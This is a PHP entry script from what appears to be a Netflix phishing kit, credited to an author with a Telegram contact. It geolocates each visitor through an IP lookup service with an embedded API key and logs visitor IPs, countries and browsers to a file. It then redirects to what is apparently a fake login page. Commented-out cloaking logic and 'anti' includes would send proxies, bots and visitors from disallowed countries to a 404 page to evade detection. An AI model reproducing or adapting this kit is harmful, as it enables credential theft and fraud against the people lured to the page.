<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/ELP4SSW0RD
    ********************************************************/

    session_start();

//    include 'prevents/anti1.php';
//    include 'prevents/anti2.php';
//    include 'prevents/anti3.php';
//    include 'prevents/anti4.php';
//    include 'prevents/anti5.php';
//    include 'prevents/anti6.php';
//    include 'prevents/anti7.php';
//    include 'prevents/anti8.php';

    require_once('auth/app/BrowserDetection.php');

    $allowed_countries = [
      //  "MA",
      //  "DE",
       // "CH",
     //   "FR",
     //   "AT",
      //  "FR",
      //  "ES",
     //   "IT",
    ];

    function get_client_ip() {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        if(filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }
        if( $ip == '::1' ) {
            return '127.0.0.1';
        }
        return  $ip;
    }

    function visitors($detection) {
        GLOBAL $ip_infos;
        $Browser = new foroco\BrowserDetection();
        $useragent       = $_SERVER['HTTP_USER_AGENT'];
        $result = $Browser->getAll($useragent, 'JSON');
        $ip              = $ip_infos['query'];
        $date            = date("Y-m-d H:i:s", time());
        $result          = json_decode($result,true);
        $os_type         = $result['os_type'];
        $os_name         = $result['os_name'];
        $device_type     = $result['device_type'];
        $browser_name    = $result['browser_name'];
        $browser_version = $result['browser_version'];
        $browser_version = $result['browser_version'];
        $country         = $ip_infos['country'];

        $str = " <tr><th scope='row'>$ip ($country)</th><td>$date</td><td>$detection</td><td>[$device_type] $browser_name $browser_version</td></tr>";
        file_put_contents('visitors.html', $str  , FILE_APPEND | LOCK_EX);
    }

    $ip = get_client_ip();
    $ip_infos = file_get_contents("https://pro.ip-api.com/php/". $ip ."?key=I8h97HB1QkUVKV0&fields=status,message,country,countryCode,timezone,currency,isp,mobile,proxy,hosting,query");
    $ip_infos = unserialize($ip_infos);

    $_SESSION['country'] = $ip_infos['country'];

   /* 
    if( $ip_infos['status'] == "success" ) {

        if( $ip_infos['proxy'] == true ) {
            visitors("Detected as bot");
            header('HTTP/1.0 404 Not Found');
            exit();
        }

        if( count($allowed_countries) > 0 ) {
            if( !in_array($ip_infos['countryCode'],$allowed_countries) ) {
                visitors("Country not allowed");
                header('HTTP/1.0 404 Not Found');
                exit();
            }
        }
        $_SESSION['user_allowed'] = true;
        visitors("Allowed");
        header("Location: auth/?pwd=netflix");
        exit();

    } else {
        visitors("Not Allowed");
        header('HTTP/1.0 404 Not Found');
        exit();
    }
    
    */
        $_SESSION['user_allowed'] = true;
        visitors("Allowed");
        header("Location: auth/?pwd=netflix");
        exit();

?>